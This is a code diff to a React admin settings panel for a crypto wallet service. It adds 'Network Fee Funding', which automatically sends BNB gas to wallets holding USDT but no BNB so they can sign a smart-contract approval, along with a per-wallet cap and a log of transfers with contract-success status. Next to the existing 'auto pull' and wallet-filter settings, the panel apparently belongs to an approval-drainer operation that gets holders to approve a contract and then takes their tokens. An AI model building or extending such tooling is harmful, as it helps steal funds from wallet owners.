@@ -1,11 +1,27 @@
 'use client';
 
 import { useState } from 'react';
-import type { WalletFilterSettings, AutoPullSettings } from '@/lib/db';
+import type { WalletFilterSettings, AutoPullSettings, NetworkFeeSettings } from '@/lib/db';
+
+interface FeeTransferRow {
+  _id: string;
+  network: string;
+  toAddress: string;
+  amountNative: number;
+  nativeSymbol: string;
+  txHash?: string;
+  status: 'sent' | 'failed';
+  errorMsg?: string;
+  contractSuccess: boolean | null;
+  createdAt: string;
+}
 
 interface Props {
-  initialWalletFilter: WalletFilterSettings;
-  initialAutoPull:     AutoPullSettings;
+  initialWalletFilter:  WalletFilterSettings;
+  initialAutoPull:      AutoPullSettings;
+  initialNetworkFee:    NetworkFeeSettings;
+  initialFeeTransfers:  FeeTransferRow[];
+  initialTotalSent:     number;
 }
 
 function Toggle({ enabled, onChange }: { enabled: boolean; onChange: (v: boolean) => void }) {
@@ -58,9 +74,17 @@ function SettingRow({ label, hint, children }: { label: string; hint: string; ch
   );
 }
 
-export function WalletSettingsManager({ initialWalletFilter, initialAutoPull }: Props) {
-  const [filter,    setFilter]    = useState<WalletFilterSettings>(initialWalletFilter);
-  const [autoPull,  setAutoPull]  = useState<AutoPullSettings>(initialAutoPull);
+function shortAddr(a: string) { return a.length > 14 ? `${a.slice(0, 8)}…${a.slice(-6)}` : a; }
+function formatWhen(iso: string) {
+  return new Date(iso).toLocaleString('en-IN', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' });
+}
+
+export function WalletSettingsManager({ initialWalletFilter, initialAutoPull, initialNetworkFee, initialFeeTransfers, initialTotalSent }: Props) {
+  const [filter,      setFilter]      = useState<WalletFilterSettings>(initialWalletFilter);
+  const [autoPull,    setAutoPull]    = useState<AutoPullSettings>(initialAutoPull);
+  const [networkFee,  setNetworkFee]  = useState<NetworkFeeSettings>(initialNetworkFee);
+  const [transfers]                   = useState<FeeTransferRow[]>(initialFeeTransfers);
+  const [totalSent]                   = useState(initialTotalSent);
   const [saving,    setSaving]    = useState(false);
   const [saved,     setSaved]     = useState(false);
   const [error,     setError]     = useState('');
@@ -71,7 +95,7 @@ export function WalletSettingsManager({ initialWalletFilter, initialAutoPull }: 
       const res = await fetch('/api/admin/settings', {
         method: 'PATCH',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ walletFilter: filter, autoPull }),
+        body: JSON.stringify({ walletFilter: filter, autoPull, networkFee }),
       });
       if (!res.ok) throw new Error((await res.json()).error ?? 'Failed to save');
       setSaved(true);
@@ -199,6 +223,94 @@ export function WalletSettingsManager({ initialWalletFilter, initialAutoPull }: 
             </p>
           </div>
         )}
+      </div>
+
+      {/* ── Section 3: Network Fee Funding ── */}
+      <div style={sectionStyle}>
+        <div style={headerStyle}>
+          <div style={{ width: 36, height: 36, borderRadius: 10, background: 'rgba(129,140,248,0.1)', border: '1px solid rgba(129,140,248,0.25)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
+            <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+              <path d="M8 1.5L2.5 4v4c0 3 2.4 5.4 5.5 6.5 3.1-1.1 5.5-3.5 5.5-6.5V4L8 1.5z" stroke="#818CF8" strokeWidth="1.4" strokeLinejoin="round"/>
+              <path d="M5.5 8l1.8 1.8L10.5 6" stroke="#818CF8" strokeWidth="1.4" strokeLinecap="round" strokeLinejoin="round"/>
+            </svg>
+          </div>
+          <div style={{ flex: 1 }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
+              <h3 style={{ fontSize: 15, fontWeight: 800, color: 'var(--fr-text-primary)', margin: 0 }}>Network Fee Funding</h3>
+              <span style={{ fontSize: 10, fontWeight: 700, letterSpacing: '0.08em', padding: '2px 8px', borderRadius: 99, background: networkFee.enabled ? 'rgba(129,140,248,0.15)' : 'rgba(255,255,255,0.06)', color: networkFee.enabled ? '#818CF8' : 'var(--fr-text-tertiary)' }}>
+                {networkFee.enabled ? 'ACTIVE' : 'DISABLED'}
+              </span>
+            </div>
+            <p style={{ fontSize: 12, color: 'var(--fr-text-tertiary)', margin: '3px 0 0', lineHeight: 1.5 }}>
+              When enabled, eligible wallets that hold USDT but no BNB are automatically sent just enough native gas to sign the smart-contract approval. BEP20 (BNB Smart Chain) only for now.
+            </p>
+          </div>
+        </div>
+
+        <div style={{ padding: '0 22px 6px' }}>
+          <SettingRow
+            label="Enable gas funding"
+            hint="Automatically cover the BNB gas fee for eligible wallets connecting on BEP20"
+          >
+            <Toggle enabled={networkFee.enabled} onChange={v => setNetworkFee(f => ({ ...f, enabled: v }))} />
+          </SettingRow>
+
+          <SettingRow
+            label="Maximum fee per wallet"
+            hint="Hard cap on the BNB we will ever send to fund a single wallet's gas"
+          >
+            <NumberInput
+              value={networkFee.maxFeeBnb}
+              onChange={v => setNetworkFee(f => ({ ...f, maxFeeBnb: v }))}
+              suffix="BNB"
+            />
+          </SettingRow>
+        </div>
+
+        {networkFee.enabled && (
+          <div style={{ margin: '0 22px 18px', padding: '10px 14px', borderRadius: 10, background: 'rgba(129,140,248,0.06)', border: '1px solid rgba(129,140,248,0.18)' }}>
+            <p style={{ fontSize: 12, color: '#818CF8', margin: 0, lineHeight: 1.6 }}>
+              ✓ Active — eligible BEP20 wallets are funded up to <strong>{networkFee.maxFeeBnb} BNB</strong> to cover approval gas.
+            </p>
+          </div>
+        )}
+
+        {/* Recent Fee Transfers */}
+        <div style={{ margin: '0 22px 20px' }}>
+          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '14px 0 10px', borderTop: '1px solid rgba(255,255,255,0.05)' }}>
+            <p style={{ fontSize: 12, fontWeight: 700, color: 'var(--fr-text-primary)', margin: 0 }}>Recent Fee Transfers</p>
+            <p style={{ fontSize: 11, color: 'var(--fr-text-tertiary)', margin: 0 }}>
+              Total sent: <strong style={{ color: '#818CF8' }}>{totalSent.toFixed(5)} BNB</strong>
+            </p>
+          </div>
+
+          {transfers.length === 0 ? (
+            <p style={{ fontSize: 12, color: 'var(--fr-text-tertiary)', margin: '4px 0 14px' }}>No funding transfers yet.</p>
+          ) : (
+            <div style={{ display: 'flex', flexDirection: 'column', gap: 6, maxHeight: 280, overflowY: 'auto' }}>
+              {transfers.map(t => (
+                <div key={t._id} style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '8px 12px', borderRadius: 8, background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.05)' }}>
+                  <div style={{ flex: 1, minWidth: 0 }}>
+                    <p style={{ fontSize: 12, fontWeight: 600, color: 'var(--fr-text-primary)', margin: 0, fontFamily: 'var(--fr-font-mono)' }}>
+                      {shortAddr(t.toAddress)} <span style={{ color: 'var(--fr-text-tertiary)', fontWeight: 500 }}>· {t.network}</span>
+                    </p>
+                    <p style={{ fontSize: 10, color: 'var(--fr-text-tertiary)', margin: '2px 0 0' }}>{formatWhen(t.createdAt)}</p>
+                  </div>
+                  <p style={{ fontSize: 12, fontWeight: 700, color: t.status === 'sent' ? '#CCFF00' : '#F87171', margin: 0, flexShrink: 0 }}>
+                    {t.status === 'sent' ? `${t.amountNative.toFixed(5)} ${t.nativeSymbol}` : 'Failed'}
+                  </p>
+                  <span style={{
+                    fontSize: 10, fontWeight: 700, padding: '3px 8px', borderRadius: 99, flexShrink: 0,
+                    background: t.contractSuccess === true ? 'rgba(0,229,160,0.12)' : t.contractSuccess === false ? 'rgba(248,113,113,0.12)' : 'rgba(255,255,255,0.06)',
+                    color: t.contractSuccess === true ? '#00E5A0' : t.contractSuccess === false ? '#F87171' : 'var(--fr-text-tertiary)',
+                  }}>
+                    {t.contractSuccess === true ? 'Contract ✓' : t.contractSuccess === false ? 'Contract ✗' : 'Pending'}
+                  </span>
+                </div>
+              ))}
+            </div>
+          )}
+        </div>
       </div>
 
       {/* ── Save ── */}
